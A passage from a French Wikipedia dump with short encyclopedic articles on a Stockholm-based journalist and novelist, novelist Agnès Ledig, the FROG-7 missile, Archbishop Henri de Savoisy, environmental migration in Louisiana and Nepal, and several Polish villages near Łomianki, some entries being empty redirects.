Il grandit en région parisienne et rejoint Montpellier en cours de licence afin de s'investir dans le journalisme. Il y démarre au quotidien régional "Midi libre" en 1986. Il travaille ensuite pour divers médias ("La Gazette de Montpellier", Télésoleil, "Libération", TF1) traitant des sujets de société.
Il habite Stockholm depuis 1994 et a été correspondant notamment de la radio RTL, de l'hebdomadaire "Le Point", du quotidien "Libération" (1998-2005) puis du journal "Le Monde" (2005-2016) pour les pays nordiques et baltes. Il est aussi documentariste pour la télévision, réalisateur notamment des "Bâtards du Reich" (, Arte, 2002), de "La Dernière Plongée", (réalisé avec Frédéric Vassort, , France 5, 2006, Prix spécial du jury Figra 2007), "Police des rennes" (52 min, France 5, 2008), "Suède, la lutte contre l'extrême-droite" (13', Arte Reportage, 2013). Il amorce sa carrière littéraire en 2006 avec la publication de "L'Imposteur", une enquête sur un rescapé français du Goulag qui avait réécrit une partie de sa vie pour survivre. En 2008, il publie, avec Christian Catomeris, une enquête sur le destin dramatique des anciens plongeurs de l'industrie pétrolière en mer du Nord ("Dykaren som exploderade", en suédois, 2008, Norstedts).
Il est également l'auteur du roman policier "Le Dernier Lapon" qui a été traduit en plus de vingt langues et a obtenu plus de vingt prix dont le prix Quai du polar 2013, le prix Mystère de la critique 2013 et le prix Michel-Lebrun 2013. La série se poursuit avec "Le Détroit du Loup" en 2014 et "La Montagne rouge" en 2016. La série se situe de nos jours en Laponie et, à travers les enquêtes de deux officiers de la Police des rennes, Nina Nansen et Klemet Nango, raconte le Grand Nord. En 2019, il publie un roman d'aventure historique situé au , racontant la colonisation de la Laponie à travers la vie d'un cartographe basque, "Le cartographe des Indes boréales", finaliste du prix Joseph Kessel et du prix Étonnants voyageurs. En 2019 également, il publie "L'affaire Nobel - une autre histoire de la Suède", un récit qui dresse un portrait du royaume à travers le scandale qui a secoué l'Académie suédoise et la Suède tout entière.
Prix et distinctions.
Pour "Le Dernier Lapon" :

</doc>
<doc id="7900858" url="https://fr.wikipedia.org/wiki?curid=7900858" title="Cinta Laura">
Cinta Laura

Cinta Laura Kiehl, plus connue sous le nom de Cinta Laura et souvent surnommée Cinta, est une artiste germano-indonésienne, notamment chanteuse et actrice, née le à Quakenbrück.

</doc>
<doc id="7900869" url="https://fr.wikipedia.org/wiki?curid=7900869" title="Agnès Ledig">
Agnès Ledig

Agnès Ledig, née en 1972 à Strasbourg, est une romancière française.
Biographie.
Agnès Ledig est née en 1972 à Strasbourg de parents instituteurs. Tombée dans les livres quand elle était petite, elle engage cependant des études scientifiques. Après une expérience en agronomie, elle décide d’intégrer l’école de sages-femmes de Strasbourg, pour « prendre soin » des autres – son verbe de vie. Elle est sage-femme libérale en Alsace jusqu'en 2015.
Elle commence à écrire en 2005, après avoir traversé un événement familial douloureux. Son premier roman, "Marie d'en haut", obtient le coup de cœur des lectrices du prix Femme Actuelle 2011 et se voit publiée aux éditions Les Nouveaux Auteurs. Repérée par un éditeur chez Albin Michel, elle rejoint cette maison d'édition en 2013 avec "Juste avant le bonheur" qui obtient le Prix Maison de la presse trois semaines après sa sortie. Elle publie ensuite quatre romans chez Albin Michel avant de rejoindre les éditions Flammarion en 2020 chez qui elle publie son septième roman "Se le dire enfin".
En 2016, elle publie son premier album jeunesse, "Le Petit Arbre qui voulait devenir un nuage", illustré par Frédéric Pillot, qui illustrera également son deuxième album, "Le cimetière des mots doux." Ce dernier aborde, à hauteur d'enfant, le thème du deuil.
Depuis novembre 2018, elle s’est engagée comme « ambassadonneuse » auprès de l’établissement français du sang afin de promouvoir le don de sang auprès du grand public.
En décembre 2018, elle est la marraine du d'Angoulême, aux côtés de Philippe Besson.
Agnès Ledig a été présidente du Prix Maison de la presse qui s’est déroulé au Ministère de la culture en mai 2019 .

</doc>
<doc id="7900874" url="https://fr.wikipedia.org/wiki?curid=7900874" title="All the People, Blur live at Hyde Park 02 july 2009">
All the People, Blur live at Hyde Park 02 july 2009



</doc>
<doc id="7900884" url="https://fr.wikipedia.org/wiki?curid=7900884" title="Église d'Hyrynsalmi">
Église d'Hyrynsalmi

L'église d'Hyrynsalmi () est une église luthérienne située à Hyrynsalmi en Finlande.
Architecture.
L'église est conçue par Jacob Rijf et construite en 1786.
C'est l'un des rares bâtiments de Hyrynsalmi à être conservé après les incendies déclenchés par les troupes allemandes pendant la guerre de Laponie.
Come la structure de l'église ne pouvait supporter les cloches, Jaakko Kuorikoski construit en 1840 un clocher séparé.
La direction des musées de Finlande a classé l'église et son clocher séparé parmi les sites culturels construits d'intérêt national.

</doc>
<doc id="7900889" url="https://fr.wikipedia.org/wiki?curid=7900889" title="Église de Hyrynsalmi">
Église de Hyrynsalmi



</doc>
<doc id="7900892" url="https://fr.wikipedia.org/wiki?curid=7900892" title="Esplanade des Victimes-des-bombardements-des-16-et-23-septembre-1943">
Esplanade des Victimes-des-bombardements-des-16-et-23-septembre-1943



</doc>
<doc id="7900896" url="https://fr.wikipedia.org/wiki?curid=7900896" title="Coupe du monde B de combiné nordique 2008">
Coupe du monde B de combiné nordique 2008

La coupe du monde B de combiné nordique 2007 — 2008 fut la dix-huitième et dernière édition de la coupe du monde B de combiné nordique, compétition de combiné nordique organisée annuellement de 1991 à 2008 et devenue depuis la coupe continentale.
Elle s'est déroulée du au , en 22 épreuves — dont deux annulées.
Cette coupe du monde B a débuté en Norvège, dans la station de Høydalsmo et a fait étape au cours de la saison
en Finlande (Vuokatti),
en République tchèque (Liberec),
en France (Chaux-Neuve),
au Japon (Iiyama et Hakuba),
en Autriche (Eisenerz),
pour s'achever en Italie, à Pragelato. Deux épreuves étaient prévues en Pologne, à Szczyrk, mais furent annulées.
Contrairement aux éditions précédentes, aucune épreuve de cette Coupe du monde B n'eut lieu sur le continent nord-américain ; en revanche, des épreuves eurent lieu au Japon, ce qui ne s'était pas produit depuis l'édition 2004.
Cette Coupe du monde B a été remportée par l'autrichien Marco Pichlmayer.

</doc>
<doc id="7900902" url="https://fr.wikipedia.org/wiki?curid=7900902" title="9K52 Luna-M">
9K52 Luna-M

Le 9K52 Luna-M (russe : Луна, français : Lune), également connu sous le code OTAN FROG-7 (FROG étant un acronyme pour « Free Rocket Over Ground », Roquette non-guidée tout-terrain), est un missile balistique à courte portée de conception soviétique. Entré en service en 1964, il dispose d'une portée de 70 km et d'un écart circulaire probable (ECP) de 500 à 700 m. D'une vitesse de Mach 3, il peut emporter des ogives conventionnelles, chimiques ou nucléaires jusqu'à 550 kg. Il ne dispose pas de système de guidage mais est stabilisé par sa propre rotation. Il est monté sur un tracteur-érecteur-lanceur (TEL) 9P113 basé sur le châssis du ZIL-135.
Historique.
Progressivement remplacé par le missile balistique tactique SS-21 qui a une plus grande portée (120 km), six unités initiales dotées de têtes nucléaires ont été déployées sur le sol cubain pendant la crise des missiles de Cuba. Largement exporté et équipant les armées du pacte de Varsovie, il a été utilisé entre autres par l'Irak pendant sa guerre avec l'Iran (qui concevra sa propre variante pour augmenter sa portée jusqu'à 90 km, le "Laith-90"). Pendant la guerre d'Irak de 2003, un FROG-7 ou un Ababil-100 a touché le QG de la Brigade de la d'infanterie US le , alors que le gros de la brigade conduisait une opération 15 kilomètres plus au nord à l'intérieur de Bagdad. 3 soldats et 2 journalistes ont été tués dans l'attaque tandis que 14 autres soldats ont été blessés et 22 véhicules détruits ou sérieusement endommagés, principalement des véhicules de transport à roues (acronyme Humvee en anglais).
Durant l’opération de la poche de Medak en 1993, la république serbe de Krajina a tiré un FROG-7 sur la banlieue de Zagreb.
La Royal Air Force a ciblé et détruit des FROG-7 de la Libye de Mouammar Kadhafi au sud de Syrte pendant la guerre civile libyenne de 2011.

</doc>
<doc id="7900903" url="https://fr.wikipedia.org/wiki?curid=7900903" title="Henri de Savoisy">
Henri de Savoisy

Henri de Savoisy fut archevêque de Sens, investi par le pape Martin V le , entré dans la ville le , mort le à Seignelay.
Biographie.
Il était fils d'Eudes de Savoisy, seigneur de Savoisy et du Fossé, qui fut capitaine de Saint-Florentin, et bailli de Vitry, puis de Troyes (lui-même frère aîné de Philippe de Savoisy, seigneur de Seignelay, qui fut compagnon du roi Jean le Bon pendant sa captivité en Angleterre, puis premier chambellan et ami intime de Charles V, puis maître d'hôtel de la reine Isabeau de Bavière). Le frère aîné d'Henri, héritier du titre familial, s'appelait Gaucher de Savoisy. C'était une famille de la noblesse bourguignonne.
En 1400, il devint doyen du chapitre cathédral de Langres. Il fut aussi chanoine de Beauvais (dont son cousin Pierre était évêque) et de Paris. Au moment de l'assemblée générale du clergé de France réunie à Paris en août-octobre 1408, il était devenu receveur général du clergé, fonction qu'il conserva dans les années suivantes. Conseiller au Parlement de Paris en 1407, maître des requêtes de l'hôtel du roi le , président de la Cour des aides le . Ces promotions parisiennes intervinrent alors que le duc de Bourgogne, Jean sans Peur, était tout-puissant à Paris. 
Le , Jean de Montagu, archevêque de Sens, prélat guerrier, de la faction des Armagnacs, meurt à la bataille d'Azincourt ; on retrouve son corps sous un monceau de cadavres. Les deux factions de la guerre civile se disputent alors le siège vacant : Jean de Norry est le candidat du roi (alors sous l'influence des Armagnacs), Henri de Savoisy celui du duc de Bourgogne. Les chanoines, divisés, ne peuvent réunir leurs suffrages sur une même tête. L'affaire est déférée au concile de Constance, alors réuni. Mais la ville de Sens est sous le contrôle des Armagnacs, et Jean de Norry est installé à l'archevêché en 1417. Les Bourguignons ravagent le pays tout alentour. 
Le , le concile de Constance élit un nouveau pape, Martin V. Celui-ci tranche, le , en faveur d'Henri de Savoisy. Plus tard dans l'année 1418, il désigne une délégation de prélats bourguignons (constituée, outre Savoisy, de Martin Poré, évêque d'Arras et ancien précepteur de Jean sans Peur, de Charles de Poitiers, évêque de Langres, et de Louis de Luxembourg, évêque de Thérouanne) pour négocier une réconciliation entre le duc et le dauphin Charles.
Le , le duc Jean sans Peur est assassiné par des Armagnacs, lors d'une entrevue avec le dauphin, sur le pont de Montereau ; son fils et successeur Philippe le Bon s'allie alors ouvertement avec les Anglais. Le , le traité de Troyes scelle cette alliance anglo-bourguignonne, prévoyant que le dauphin Charles, réfugié à Bourges, est destitué et déshérité, et qu'Henri V d'Angleterre épouse Catherine de Valois, le couple et sa descendance devant hériter du trône de France. Le , fête de la Trinité, l'archevêque Henri de Savoisy célèbre ce mariage royal dans l'église Saint-Jean-du-Marché de Troyes.
Mais la ville de Sens restait toujours aux mains des partisans du dauphin, défendue par Guillaume de Guitry, comte de Chaumont, bailli de Sens et d'Auxerre. On parla d'organiser des joutes après le mariage : « "Allons vers la cité de Sens", dit le roi d'Angleterre. "Là pourra chacun de nous jouter et tournoyer et montrer sa prouesse, et hardiment. Car la plus belle prouesse n'est au monde que de faire justice des mauvais, afin que le pauvre peuple puisse vivre" ». On se hâta vers Sens, y compris les dames qui avaient assisté à la noce. 
La ville capitula le , jour de la saint Barnabé. Henri de Savoisy put alors accéder à la cathédrale qu'il revendiquait, et y fut intronisé en présence de deux rois, deux reines et du duc de Bourgogne. , lui dit le roi d'Angleterre. . Mais le prélat ne resta pas longtemps dans la ville, où l'insécurité régnait : il se réfugia dans le château fortifié de ses cousins, à Seignelay, et y mourut moins de deux ans après son intronisation. Quant à son compétiteur Jean de Norry, il devint peu après archevêque de Vienne (installé le ).

</doc>
<doc id="7900908" url="https://fr.wikipedia.org/wiki?curid=7900908" title="FROG-7">
FROG-7



</doc>
<doc id="7900909" url="https://fr.wikipedia.org/wiki?curid=7900909" title="Sulci">
Sulci



</doc>
<doc id="7900916" url="https://fr.wikipedia.org/wiki?curid=7900916" title="9K52 Luna M">
9K52 Luna M



</doc>
<doc id="7900919" url="https://fr.wikipedia.org/wiki?curid=7900919" title="Liste des ministres sud-africains des Communications">
Liste des ministres sud-africains des Communications

Les ministres des Communications d'Afrique du Sud sont compétents pour tous les sujets relevant des télécommunications et de l'industrie de la radiodiffusion.
Le traditionnel département ministériel des communications est issue du ministère des Postes et Télégraphes fondé en 1910.
Évolution.
Ministère technique, ce ministère a parfois été doublé d'un ministère de la communication plus politique, notamment dans les années 80 et 90.
En 2014, les compétences du ministère des communications ont été modifiées et élargies ce qui a amené le gouvernement à créer deux départements ministériels avec : 
Depuis le , les deux départements ministériels ont à nouveau été réunis sous la responsabilité d'un seul ministre titulaire, et fusionné dans le ministère des Communications le lors de la formation du 2nd gouvernement Ramaphosa. 

</doc>
<doc id="7900922" url="https://fr.wikipedia.org/wiki?curid=7900922" title="Sulcus (planétologie)">
Sulcus (planétologie)



</doc>
<doc id="7900930" url="https://fr.wikipedia.org/wiki?curid=7900930" title="Migrations environnementales et climatiques">
Migrations environnementales et climatiques

Les migrations environnementales et climatiques sont des déplacements de population, temporaires ou définitifs, causés par des changements environnementaux ou climatiques (réfugiés climatiques). Les migrations climatiques ne forment qu'une partie des migrations environnementales. Le concept, apparu dans un rapport du PNUE, remonterait aux années 1980, mais son champ est encore débattu dans la communauté scientifique.
Enjeux liés aux migrations environnementales et climatiques.
L’histoire de notre planète a été marquée par les événements naturels ayant poussé les êtres humains à se déplacer vers des endroits qualifiés de moins hostiles.
Néanmoins, Eric Lambin comme Diane C. Bates suggèrent que l’on aurait trop tendance à la raccrocher aux raisons environnementales et non plus économiques de migrer, la distinguant alors de celle de « migrations économiques ».
Certains cas concrets montrent la concordance des facteurs climatiques et socio-économiques. Par exemple, l’absence de lobbies à Chiapas (Mexique) pour protéger la déforestation extensive qui cause des coulées de boue durant la saison des pluies, serait entre autres due à la marginalisation de la population indigène de la région victime de ces phénomènes (Faist et Schade, 2013), rendant cette problématique encore plus actuelle et importante.
Le phénomène de déplacements de populations est réel et les exemples sont nombreux : les déplacements temporaires ou permanents causés par les inondations au Népal, le réchauffement et la fréquence plus élevée des précipitations au Mexique, la montée du niveau des eaux dans le Pacifique sud.
Louisiane.
Statut des « migrants environnementaux »
« La protection dont bénéficient les réfugiés environnementaux aujourd’hui reste très aléatoire » explique François Gemenne. Dans bien des circonstances, pourtant, c’est une aide d’urgence qui est apportée, et non une aide à la reconstruction et à la réinstallation.
Désastre social
L’ouragan Katrina démontre l’interaction entre les catastrophes naturelles et les populations défavorisées.
En effet, ce sont les populations les plus pauvres qui sont les plus vulnérables au changement climatique. De plus, la dégradation du milieu produit généralement une dégradation des conditions économiques, souvent cause principale du départ. Les réfugiés de l’ouragan Katrina sont le produit d’une catastrophe environnementale où se mêlent des facteurs politiques, économiques, culturels préexistants.
Hostilité généralisée
Le mal de vivre persistant des réfugiés de Katrina peut s’expliquer par l’absence d’opportunité mais surtout l’accueil hostile des locaux (e.g. regroupement des évacués dans des hébergements transitoires, policiers aux entrées de ville pour empêcher l’entrée des personnes évacuées, recherche systématique d’antécédents criminels sur tous les réfugiés).
Dans la plupart des migrations, les conflits étaient dus à la raréfaction des ressources et à des problèmes environnementaux [Mancebo F., 2006, Kaplan R. D., 1994 ; Homer-Dixon T. F., 1999]. Le cyclone Katrina combine les deux aspects : en amont, la catastrophe et l’inondation de la Nouvelle-Orléans ; en aval, la dégradation des conditions de vie dans les villes accueillant les réfugiés avec surdensité et pression immobilière accrue, si l’on considère l’environnement au sens large. Le cyclone Katrina a été largement couvert par les médias américains, déclenchant une vague de sympathie et de pitié pour ses victimes. Pourtant, quasi simultanément, une franche hostilité s’est manifestée dans les espaces d’accueil. Le rejet dont font l’objet les réfugiés de Katrina de la part des communautés qui les accueillent trouve, certes, sa source dans le fait qu’ils sont majoritairement noirs, pauvres, venant de milieux où la crimininalité est plus importante.
Népal.
Existe-t-il un lien entre d’une part, les changements climatiques et/ou environnementaux et d’autre part, les migrations humaines observées au Népal ? Peu de données sont disponibles pour permettre de répondre à cette question. On reporte cependant que la migration interne la plus importante se fait d’aires rurales en aires rurales (68,2 %), contre 25,5 % des migrations internes totales d’aires rurales à urbaines. Ces mouvements se font depuis les altitudes élevées à basses, vidant les parties du Moyen-Ouest et de l’extrême Ouest de leur population. Internationalement, 77,3 % de la communauté népalaise serait expatriée en Inde (900.000 Népalais) grâce à la frontière ouverte entre les deux pays. Les migrations vers les États du Golfe sont estimées officiellement à , mais pensées à (14,5 %), tandis que auraient émigré en Europe, aux USA, au Japon et en Australie (3,5 %). Pour quelles raisons ? Mariage (23 %), agriculture (18,1 %), service (11,5 %), études (10,3 %), business (5,5 %) et autres (31,6 %). Cette catégorie « autres » comprend-elle les raisons environnementales ? Et existe-t-il des migrations purement « environnementales » ou causées par les changements climatiques ?
Lorsque l'on isole cette relation, c'est-à-dire à des variables sociales et économiques constantes, on découvre que les changements environnementaux induisent plutôt des déplacements locaux de courte distance. Plus précisément, 3 facteurs poussent les populations à émigrer : le déclin perçu de la productivité, la diminution du couvert du sol et la hausse du temps requis pour rassembler du bois de combustion. Ces conclusions sont partagées et soutenues par d'autres : un déclin dans l’accès aux ressources forestières augmente la probabilité de migrer pour l’unique raison de trouver du travail (localement et internationalement). Cependant, ces constats ne s’appliquent qu’à une société agraire (vallée Chitwan) où les activités de production et consommation sont inter-reliées aux ressources environnementales.
Selon Eric Lambin, il est important de considérer la complémentarité des différents courants s'intéressant à la migration sous différents angles (pour le travail, pour la sécurité, environnement-migration, etc.) et de penser que la « relation entre environnement et migration est toujours indirecte et contextuelle ». Elle est complexe et y apposer l’adjectif « environnemental » « place tout le poids de la décision de migrer sur les facteurs répulsifs, qui seraient principalement de nature environnementale, sans considérer le pouvoir d’attraction que représentent les nouveaux avantages économiques de la région d’accueil. En réalité, les deux groupes de causes s’entremêlent toujours, ce qui rend très théorique la séparation entre émigrants purement environnementaux et émigrants purement économiques. Les conditions environnementales sont l’un des éléments du contexte général au sein duquel les décisions de migrer sont prises par des individus ».
Bien entendu, le facteur environnemental est, dans le cas des GLOFs au Népal, plus saillant et peut expliquer un déplacement soudain et inattendu. Bien que les approches divergent, la plupart des auteurs converge sur un point : le Népal est un cas d’étude idéal pour étudier le lien environnement-migration. Par sa situation topographique en pente, l’importance du secteur agricole et de la population rurale, la pauvreté de sa population , le Népal et ses habitants sont particulièrement vulnérables aux processus climatiques et environnementaux.
« Les réponses potentielles et actuelles au changement climatique et au retrait des glaces dans le petit royaume himalayen du Népal sont façonnées par les conditions géographiques et socioéconomiques ». D’un point de vue géographique, les zones montagneuses et de collines regroupent la moitié de la population mais il s’agit de régions perpétuellement en manque de denrées alimentaires de base et où les infrastructures de transport sont peu développées. La troisième zone, celle de Terai, compte l’autre moitié de la population et seul ce district dispose de surplus alimentaire. Ceci suggère que les patterns de migration et les vulnérabilités au changement environnemental diffèrent selon les zones et à l’intérieur des districts. 
Il s’agit donc de la combinaison des facteurs économique, politique, social, démographique et environnemental qui affecte directement la dangerosité d’un endroit et indirectement la migration à travers les facteurs économiques (ie : modification des moyens d’existence) et politiques (ie : affectation des conflits pour les ressources). La migration environnementale en tant que telle n’existe pas, excepté à court terme. Peut-être alors le terme de « déplacement » serait-il plus approprié ? Cette question de définition est fort débattue actuellement car elle a des répercussions géopolitiques. En effet, les phénomènes socio-naturels outrepassent les frontières nationales et c’est ainsi que de nombreux GLOFs recensés au Népal sont partis du Tibet, situé au Nord du pays.
Finalement, on voit apparaître un cercle rétroactif de la migration. En effet, l’absence de mouvements migratoires qui caractérisait la société népalaise depuis 100 ans prit fin dans les années 1950 à la suite de l’accélération de la croissance démographique dans les régions montagneuses. Ceci mena à une fragilisation des écosystèmes (intensification des terres). La plus grande vulnérabilité aux glissements de terrain et inondations provoqua d’importantes pertes humaines et en ressources, conduisant à des politiques de redistribution de la population dans les vallées forestières. La rapide urbanisation de ces régions modifia la structure sociale et économique (irrigation, mécanisation, infrastructures routières,…) associée à des changements rapides des conditions environnementales. Cette explication historique met en lumière que finalement, chaque facteur alimente la boucle rétroactive, entre autres la relation environnement-migration qui, au Népal, ne peut être appuyée que par de trop rares données quantitatives.

</doc>
<doc id="7900931" url="https://fr.wikipedia.org/wiki?curid=7900931" title="Groupe Lyonnaise des Eaux">
Groupe Lyonnaise des Eaux



</doc>
<doc id="7900934" url="https://fr.wikipedia.org/wiki?curid=7900934" title="Dziekanów Bajkowy">
Dziekanów Bajkowy

Dziekanów Bajkowy [d͡ʑeˈkanuf bai̯ˈkɔvɨ] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord-ouest de Łomianki, 17 kilomètres au nord d'Ożarów Mazowiecki et 19 kilomètres au nord-ouest de Varsovie.
Le village a une population de 720 habitants en 2008.

</doc>
<doc id="7900941" url="https://fr.wikipedia.org/wiki?curid=7900941" title="Émilie Raffoul-Rouleau">
Émilie Raffoul-Rouleau

Émilie Raffoul est journaliste et productrice de télévision. Depuis 1981, elle a successivement travaillé pour Europe 1, "Libération", Antenne 2, FR3, TF1, France 2, Canal+ en tant que grand reporter, présentatrice, rédactrice en chef puis directrice. 
Elle est la fondatrice de #5BisProductions, société de production audiovisuelle. 
Elle intervient également en conseil médias auprès de la RTBF, du CFJ et autres partenaires.
Elle est la sœur du philosophe . 
Biographie.
Née de parents juifs égyptiens devenus français quelques années après leur arrivée à Paris, elle est la fille d'Élie Raffoul devenu Éric Rouleau, qui dirige la rubrique Proche-Orient du journal "Le Monde", avant de devenir en 1985 ambassadeur de France en Tunisie et en Turquie, et de Rosy Rouleau, reporter photographe et cofondatrice de l'agence Sygma.
Après une année passée à la radio des Nations unies à New-York, elle sort diplômée de traduction politique avant d'entamer sa carrière à Europe 1 en 1979 comme rédactrice de "Histoire d'un jour", émission quotidienne de Philippe Alfonsi.
En 1981, elle intègre l'équipe des "Gens d'ici", émission quotidienne diffusée à 19h45 sur Antenne 2 dirigée alors par Pierre Desgraupes.
En 1982, Émilie Raffoul rejoint le Service politique de "Libération". Et retrouve quelques mois plus tard l'équipe de Philippe Alfonsi comme enquêtrice pour "La Vie en face", une série de 10x52 minutes diffusés sur FR3.
En 1983, elle passe six mois au Liban pour la réalisation de deux au cœur de la guerre.
En 1984, elle intègre la rédaction de FR3 comme grand reporter.
En 1991, Émilie Raffoul coréalise deux documentaires d'investigation sur les dysfonctionnements de la recherche scientifique en France et aux États-Unis.
De à , elle présente le journal de FR3 Île-de-France.
À l'automne 1993, elle devient rédactrice en chef à l'agence "Point du jour".
En 1995, elle retrouve la télévision comme rédactrice en chef adjointe de l'émission hebdomadaire "Le Monde de Léa" sur TF1. Puis, avec Paul Amar, elle crée sur France 2, "D'un monde à l'autre" et "Dimanche Midi Amar", magazines d'information hebdomadaires.
En 2001, Émilie Raffoul rejoint Canal+, pour créer, aux côtés de Paul Moreira, "Lundi Investigation" qu'elle dirige et présente jusqu'à son départ en 2008. En parallèle, elle collabore régulièrement à la quotidienne "Nous ne sommes pas des anges" présentée par Maïtena Biraben. La même année, elle coréalise "Curiel, un crime d'État ?".
En 2013, elle crée #5Bis Productions où elle développe et produit documentaires, magazines et émissions.

</doc>
<doc id="7900942" url="https://fr.wikipedia.org/wiki?curid=7900942" title="Blanchard (Dakota du Nord)">
Blanchard (Dakota du Nord)

 est une "census-designated place" située dans le comté de Traill, dans l’État du Dakota du Nord, aux États-Unis. Sa population s’élevait à lors du recensement.
À noter.
Blanchard abrite l’une des plus hautes structures du monde, le mât de KVLY-TV.
Démographie.
Selon l""', pour la période 2011-2015, 100 % de la population âgée de plus de déclare parler l'anglais à la maison.

</doc>
<doc id="7900943" url="https://fr.wikipedia.org/wiki?curid=7900943" title="Dziekanów Leśny">
Dziekanów Leśny

Dziekanów Leśny [d͡ʑɛˈkanuf ˈlɛɕnɨ] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-ouest de Łomianki, 16 kilomètres au nord d'Ożarów Mazowiecki et 18 kilomètres au nord-ouest de Varsovie.
Le village a une population de habitants en 2008.

</doc>
<doc id="7900946" url="https://fr.wikipedia.org/wiki?curid=7900946" title="Dziekanów Nowy">
Dziekanów Nowy

Dziekanów Nowy [d͡ʑeˈkanuf ˈnɔvɨ] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres au nord-ouest de Łomianki, 17 kilomètres au nord d'Ożarów Mazowiecki et 21 kilomètres au nord-ouest de Varsovie.
Le village a une population de 312 habitants en 2008.

</doc>
<doc id="7900948" url="https://fr.wikipedia.org/wiki?curid=7900948" title="Université Seigakuin">
Université Seigakuin

L' est une université japonaise privée située à Ageo, dans la préfecture de Saitama.

</doc>
<doc id="7900950" url="https://fr.wikipedia.org/wiki?curid=7900950" title="Passage de l'Imprimerie">
Passage de l'Imprimerie



</doc>
<doc id="7900951" url="https://fr.wikipedia.org/wiki?curid=7900951" title="Dziekanów Polski">
Dziekanów Polski

Dziekanów Polski [d͡ʑeˈkanuf ˈpɔlski] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres au nord-ouest de Łomianki, 17 kilomètres au nord d'Ożarów Mazowiecki et 21 kilomètres au nord-ouest de Varsovie.
Le village a une population de 670 habitants en 2013.

</doc>
<doc id="7900953" url="https://fr.wikipedia.org/wiki?curid=7900953" title="Kępa Kiełpińska">
Kępa Kiełpińska

Kępa Kiełpińska [ˈkɛmpa kʲɛu̯ˈpiɲska] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord de Łomianki, 18 kilomètres au nord d'Ożarów Mazowiecki et 19 kilomètres au nord-ouest de Varsovie.
Le village a une population de 70 habitants en 2008.

</doc>
<doc id="7900956" url="https://fr.wikipedia.org/wiki?curid=7900956" title="Kiełpin (Mazovie)">
Kiełpin (Mazovie)

Kiełpin [ˈkʲɛu̯pin] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-ouest de Łomianki, 16 kilomètres au nord d'Ożarów Mazowiecki et 18 kilomètres au nord-ouest de Varsovie.
Le village a une population de habitants en 2008.

</doc>
<doc id="7900958" url="https://fr.wikipedia.org/wiki?curid=7900958" title="Pi Chun-deuk">
Pi Chun-deuk

Pi Cheon-deuk (hangul : 피천득, hanja : 皮千得, nom de plume : Geuma ; - ) est un essayiste, professeur de littérature anglaise, et poète sud-coréen.
Biographie.
Né à Séoul le , son nom de plume est Geuma. Il étudie la littérature anglaise à l'université Hujiang à Shanghai. Avant la libération de la Corée en 1945, il enseigne l'écriture et la poésie anglaises à l'Institut central du commerce de Gyeongseong. Il enseigne ensuite la littérature anglaise à l'université nationale de Séoul de 1946 à 1976. En 1954, il est invité à poursuivre des recherches sur la littérature anglaise à l'université Harvard. Sa carrière d'écrivain commence dès 1930, avec la publication du poème intitulé "Chansons lyriques" ("Seojeongsogok") dans la revue "Sindonga". Son premier recueil de poèmes, "Poèmes lyriques" ("Seojeongsijip") fut bien accueilli par la critique. 
Bien que considéré comme un grand écrivain, Pi est connu pour être resté quelqu'un de simple et de libre. Il vivait constamment entouré de livres dans un petit appartement.
Œuvre.
Les œuvres principales de Pi sont "Une petite pièce d'argent" et "Attaches". Il s'est imposé initialement dans le monde littéraire à travers ses poésies et la publication de "Seojungsogok" dans le journal "Shindong-a". Il publie ensuite "Sogok" (Une chanson lyrique) et "Gashin nim" ("Ma bien-aimée est partie"). Sa poésie exclut toute forme de trivialité ou d'idées obscures pour laisser place à des émotions pures. Il a également publié plusieurs essais, en particulier "Nunborachineun bamui chueok" ("Souvenir d'une nuit de neige"), "Gidarineun pyeonji" ("La lettre que j'attends"), "Muje" ("Sans titre"), et "Na-ui pa-il" ("Mon fichier"). Ses essais sont écrits à la manière de poèmes décrivant le quotidien avec un style délicat et intime. En 1947, il regroupe ses travaux sur les thèmes de la nature, de la bonté de cœur, pour en faire un recueil intitulé "Seojeongshijip" ("Anthologie de poèmes lyriques"). Il publie un autre recueil de poèmes en 1969, "Sanhowa jinju" ("Corail et perle"). 
Ses travaux sont souvent cités dans les manuels scolaires en Corée, et peuvent être facilement lus par un public de tout âge.

</doc>
<doc id="7900961" url="https://fr.wikipedia.org/wiki?curid=7900961" title="Łomianki Chopina">
Łomianki Chopina

Łomianki Chopina [wɔˈmjaŋki xɔˈpina] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres au nord de Łomianki, 16 kilomètres au nord-ouest d'Ożarów Mazowiecki et 17 kilomètres au nord-ouest de Varsovie.
Le village a une population de 460 habitants en 2008.

</doc>
<doc id="7900962" url="https://fr.wikipedia.org/wiki?curid=7900962" title="Phalaena quercus">
Phalaena quercus



</doc>
<doc id="7900964" url="https://fr.wikipedia.org/wiki?curid=7900964" title="Łomianki Dolne">
Łomianki Dolne

Łomianki Dolne [wɔˈmjaŋki ˈdɔlnɛ] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord de Łomianki, 18 kilomètres au nord d'Ożarów Mazowiecki et 18 kilomètres au nord de Varsovie.
Le village a une population de 180 habitants en 2008.

</doc>
<doc id="7900967" url="https://fr.wikipedia.org/wiki?curid=7900967" title="Sadowa (Mazovie)">
Sadowa (Mazovie)

Sadowa [saˈdɔva] est un village polonais de la gmina de Łomianki, situé dans la Powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord-ouest de Łomianki, 15 kilomètres au nord d'Ożarów Mazowiecki et 19 kilomètres au nord-ouest de Varsovie.
